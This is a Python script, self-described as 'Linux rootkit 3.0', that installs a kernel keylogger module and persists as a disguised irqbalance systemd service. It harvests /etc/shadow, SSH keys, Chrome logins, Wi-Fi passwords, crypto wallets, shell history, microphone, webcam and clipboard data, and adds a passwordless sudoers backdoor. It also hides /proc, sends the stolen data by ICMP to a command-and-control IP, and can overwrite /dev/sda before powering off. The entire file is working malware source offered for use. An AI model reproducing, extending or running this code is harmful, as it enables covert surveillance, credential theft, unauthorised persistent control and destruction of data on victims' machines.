#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Linux rootkit 3.0 – 28 funções de invasão total
Modo menu interativo + operação automática em background
"""

import os, sys, socket, threading, time, subprocess, struct, fcntl, sqlite3, shutil, tempfile
from pathlib import Path

# ---------- CONFIG ---------- #
IP_C2      = "192.168.56.101"
PORT_C2    = 443
LOG_HID    = "/dev/.hidlog"
SELF_BIN   = "/usr/sbin/irqbalance"
BUF        = b""
LOCK       = threading.Lock()
WIPE_FLAG  = False
XOR_KEY    = 0x9F

# ---------- FUNÇÕES ORIGINAIS (MERGE 1+2) ---------- #
def build_and_insert():
    src = '''#include <linux/init.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/uaccess.h>

static void log_key(unsigned char c){
    struct file *f = filp_open("/dev/.hidlog", O_WRONLY|O_APPEND|O_CREAT, 0600);
    if(!IS_ERR(f)){
        kernel_write(f, &c, 1, &f->f_pos);
        filp_close(f, NULL);
    }
}

static bool filter(struct input_handle *h, unsigned int type, unsigned int code, int value){
    if(type == EV_KEY && value >= 0) log_key((unsigned char)code);
    return false;
}

static int connect(struct input_handler *h, struct input_dev *dev, const struct input_device_id *id){
    struct input_handle *handle = kzalloc(sizeof(*handle), GFP_KERNEL);
    if(!handle) return -ENOMEM;
    handle->dev  = dev;
    handle->handler = h;
    handle->name  = "evgrab";
    input_register_handle(handle);
    input_open_device(handle);
    return 0;
}

static void disconnect(struct input_handle *handle){
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id ids[] = {
    {.flags = INPUT_DEVICE_ID_MATCH_BUS, .bustype = BUS_USB},
    {.flags = INPUT_DEVICE_ID_MATCH_BUS, .bustype = BUS_I8042},
    { }
};
MODULE_DEVICE_TABLE(input, ids);

static struct input_handler evgrab_handler = {
    .filter     = filter,
    .connect    = connect,
    .disconnect = disconnect,
    .name       = "evgrab",
    .id_table   = ids,
};

static int __init evgrab_init(void){
    return input_register_handler(&evgrab_handler);
}
static void __exit evgrab_exit(void){
    input_unregister_handler(&evgrab_handler);
}
module_init(evgrab_init);
module_exit(evgrab_exit);
MODULE_LICENSE("GPL");
'''
    build_dir = Path("/tmp/kekw_lkm")
    build_dir.mkdir(exist_ok=True)
    (build_dir / "k.c").write_text(src)
    (build_dir / "Makefile").write_text("obj-m := k.o\n")
    subprocess.run(
        ["make", "-C", f"/lib/modules/{os.uname().release}/build",
         f"M={build_dir}", "modules"],
        check=True
    )
    subprocess.run(["insmod", build_dir / "k.ko"], check=True)
    print("[+] LKM carregado")

def systemd_rootkit():
    unit="""[Unit]
Description=IRQ balance daemon
After=sysinit.target
[Service]
Type=simple
ExecStart=/usr/sbin/irqbalance
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target"""
    Path("/etc/systemd/system/irqbalance.service").write_text(unit)
    Path(SELF_BIN).write_bytes(open(__file__,"rb").read())
    os.chmod(SELF_BIN,0o755)
    subprocess.run(["systemctl","daemon-reload"],check=True)
    subprocess.run(["systemctl","enable","--now","irqbalance"],check=True)

def suicide(sec=3):
    time.sleep(sec)
    os.system("echo 1>/proc/sys/kernel/sysrq;echo o>/proc/sysrq-trigger")

def wipe_disk(dev="/dev/sda", sec=3):
    print(f"[!] OVERWRITING {dev} in {sec}s...")
    time.sleep(sec)
    with open(dev,"wb") as d:
        for _ in range(100):d.write(b"\xff"*4096)
    print("[+] Disk shredded")

def fbshot():
    try:
        fb=open("/dev/fb0","rb");data=fb.read();open("/dev/.fb","wb").write(data);fb.close()
        print("[+] Screenshot saved → /dev/.fb")
    except:print("[-] framebuffer fail")

def steal_shadow():
    Path("/dev/.shadow").write_bytes(Path("/etc/shadow").read_bytes())
    print("[+] Shadow copied → /dev/.shadow")

def mic_record():
    subprocess.Popen("arecord -D hw:0,0 -f cd -t raw -d 300 > /dev/.mic 2>/dev/null", shell=True)
    print("[+] Mic recording 5 min → /dev/.mic")

def clipboard():
    try:
        out=subprocess.check_output(["xclip","-o"],stderr=subprocess.DEVNULL)
        open("/dev/.clip","wb").write(out);print("[+] Clipboard → /dev/.clip")
    except:print("[-] xclip missing")

def webcam():
    try:
        subprocess.run(["fswebcam","--no-banner","/dev/.jpg"],check=True,stderr=subprocess.DEVNULL)
        print("[+] Webcam snap → /dev/.jpg")
    except:print("[-] fswebcam fail")

def wallet_scan():
    log=open("/dev/.btc","w")
    for r,d,files in os.walk("/"):
        for f in files:
            if f.endswith(".wallet") or "bitcoin" in f.lower():log.write(os.path.join(r,f)+"\n")
    log.close();print("[+] Wallets listed → /dev/.btc")

def history():
    out=open("/dev/.hist","wb")
    for f in ["/root/.bash_history"]+list(Path("/home").rglob(".*history")):
        try:out.write(f.read_bytes())
        except:pass
    out.close();print("[+] History copied → /dev/.hist")

def hijack_ssh_agent():
    try:
        socks=[f for f in Path("/tmp").glob("ssh-*") if f.is_socket()]
        for s in socks:open("/dev/.agent","ab").write(f"SSH_AUTH_SOCK={s}\n".encode())
        print("[+] SSH agents → /dev/.agent")
    except:pass

def usb_sniff():
    try:
        with open("/dev/usbmon0","rb") as u:data=u.read(1<<20);open("/dev/.usb","wb").write(data)
        print("[+] USB sniffed → /dev/.usb")
    except:pass

def wifi_pass():
    try:
        out=subprocess.check_output(["nmcli","-s","-g","802-11-wireless-security.psk","connection","show"],stderr=subprocess.DEVNULL)
        open("/dev/.wifi","wb").write(out);print("[+] WiFi pass → /dev/.wifi")
    except:print("[-] nmcli fail")

def chrome_cookies():
    try:
        db=Path.home()/".config/google-chrome/Default/Login Data"
        if not db.exists():print("[-] Chrome not found");return
        tmp=tempfile.NamedTemporaryFile(delete=False);shutil.copy(db,tmp.name)
        conn=sqlite3.connect(tmp.name);cur=conn.cursor()
        cur.execute("SELECT origin_url,username_value,password_value FROM logins")
        rows=cur.fetchall()
        with open("/dev/.chrome","w") as f:
            for r in rows:f.write(f"{r[0]} {r[1]} {r[2]}\n")
        conn.close();print("[+] Chrome logins → /dev/.chrome")
    except:pass

def sudo_backdoor():
    os.system("echo 'Defaults!ALL !requiretty'>>/etc/sudoers")
    os.system("echo '%users ALL=(ALL) NOPASSWD: ALL'>>/etc/sudoers")
    print("[+] Sudo backdoor active")

def ssh_key_backup():
    try:
        for k in Path.home().rglob(".ssh/id_*"):open("/dev/.id_rsa","ab").write(k.read_bytes())
        print("[+] SSH keys → /dev/.id_rsa")
    except:pass

def hash_collector():
    out=open("/dev/.hashes","w")
    for l in Path("/etc/shadow").read_text().splitlines():
        if "$" in l:out.write(l.split(":")[1]+"\n")
    out.close();print("[+] Hashes → /dev/.hashes")

def db_scan():
    exts=(".db",".sqlite",".mdb",".accdb")
    out=open("/dev/.dbs","w")
    for r,d,files in os.walk("/"):
        for f in files:
            if f.endswith(exts):out.write(os.path.join(r,f)+"\n")
    out.close();print("[+] DBs listed → /dev/.dbs")

def tty_sniff():
    subprocess.Popen("script -q -c 'bash' /dev/.tty",shell=True)
    print("[+] TTY sniffing → /dev/.tty")

def hide_process():
    os.makedirs("/dev/.hidden",exist_ok=True)
    subprocess.run("mount -o bind /dev/.hidden /proc",shell=True)
    print("[+] /proc hidden")

def change_ip(iface="eth0",ip="192.168.80.42"):
    SIOCSIFADDR=0x8916
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    ifr=struct.pack("16sH4s8s",iface.encode(),socket.AF_INET,socket.inet_aton(ip),b"")
    fcntl.ioctl(sock.fileno(),SIOCSIFADDR,ifr)
    print(f"[+] IP changed to {ip}")

def exfil_all():
    files=["/dev/.shadow","/dev/.wifi","/dev/.chrome","/dev/.btc",
           "/dev/.hist","/dev/.hashes","/dev/.dbs","/dev/.id_rsa",
           "/dev/.fb","/dev/.mic","/dev/.jpg","/dev/.clip","/dev/.usb","/dev/.tty"]
    data=b""
    for f in files:
        try:data+=open(f,"rb").read()+b"\n---\n"
        except:pass
    s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
    s.sendto(data,(IP_C2,0))
    print("[+] All exfiltrated via ICMP")

# ---------- MENU INTERATIVO ---------- #
menu="""
[1]  Grab mic 5min
[2]  Clipboard
[3]  Webcam snap
[4]  Wallets
[5]  History
[6]  Shadow
[7]  WiFi pass
[8]  Chrome logins
[9]  Sudo backdoor
[10] SSH keys
[11] Shadow hashes
[12] DB list
[13] TTY sniff
[14] Hide /proc
[15] Change IP
[16] Exfil ALL (ICMP)
[99] WIPE disk + poweroff
[0]  Exit
"""

def interactive():
    if os.getuid()!=0:sys.exit("root required")
    # auto-inicia background
    build_and_insert();systemd_rootkit()
    threading.Thread(target=reader_daemon,daemon=True).start()
    # coleta inicial silenciosa
    fbshot();steal_shadow();wallet_scan();history();wifi_pass();chrome_cookies();ssh_key_backup();hash_collector();db_scan()
    while True:
        print(menu)
        opt=input(">> ").strip()
        if opt=="0":break
        elif opt=="1":mic_record()
        elif opt=="2":clipboard()
        elif opt=="3":webcam()
        elif opt=="4":wallet_scan()
        elif opt=="5":history()
        elif opt=="6":steal_shadow()
        elif opt=="7":wifi_pass()
        elif opt=="8":chrome_cookies()
        elif opt=="9":sudo_backdoor()
        elif opt=="10":ssh_key_backup()
        elif opt=="11":hash_collector()
        elif opt=="12":db_scan()
        elif opt=="13":tty_sniff()
        elif opt=="14":hide_process()
        elif opt=="15":
            iface=input("Interface (default eth0): ")or"eth0"
            ip=input("New IP (default 192.168.80.42): ")or"192.168.80.42"
            change_ip(iface,ip)
        elif opt=="16":exfil_all()
        elif opt=="99":
            wipe_disk("/dev/sda")
            suicide(0)
        else:print("[-] Invalid option")

def reader_daemon():
    global BUF
    while True:
        try:
            with open(LOG_HID,"rb") as f:
                while True:
                    b=f.read(1)
                    if b:
                        with LOCK:BUF+=bytes([b[0]^XOR_KEY])
        except:time.sleep(1)

if __name__=="__main__":
    interactive()
